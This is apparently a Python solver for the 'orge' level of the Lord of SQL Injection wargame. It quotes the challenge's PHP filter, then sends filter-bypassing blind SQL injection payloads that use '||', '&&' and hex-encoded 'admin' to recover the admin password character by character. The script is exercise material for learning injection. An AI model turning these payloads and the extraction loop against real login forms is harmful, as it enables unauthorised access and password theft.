#!/usr/bin/env python3
import pickle
import los
from getpass import getpass


def main():
    '''
    Orge

    if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
    if(preg_match('/or|and/i', $_GET[pw])) exit("HeHe"); 
    $query = "select id from prob_orge where id='guest' and pw='{$_GET[pw]}'"; 
    echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
    $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
    if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 

    $_GET[pw] = addslashes($_GET[pw]); 
    $query = "select pw from prob_orge where id='admin' and pw='{$_GET[pw]}'"; 
    $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
    if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("orge");  
    '''

    url = "https://los.rubiya.kr/chall/orge_bad2f25db233a7542be75844e314e9f3.php"

    try:
        with open('cooks.pickle', 'rb') as f:
            cook = pickle.load(f)
    except:
        cook = {'PHPSESSID': getpass(
            prompt='enter PHPSESSID cookie: ')}

    if "location.href='../';" in los.get_request(url, {}, cook, print_param=False):
        print('you need to login in browser')
        exit(1)

    payload = "'||length(pw)>%s&&id=0x61646d696e#"
    len_of_key = los.find_key_len(url, payload, 'pw', 'Hello admin', cook)

    print(len_of_key)

    payload = "'||id='admin'&&ascii(mid(pw,%s,1))%s#"
    result = los.find_binary(url, payload,
                             'pw', 'Hello admin', 32, 127, len_of_key, cook)

    print(result)

    param = dict(pw=result)
    response = los.get_request(url, param, cook)

    if 'Clear!' in response:
        print('ORGE Clear!')

    # Save cookie
    los.save_cookies(cook)


if __name__ == '__main__':
    main()
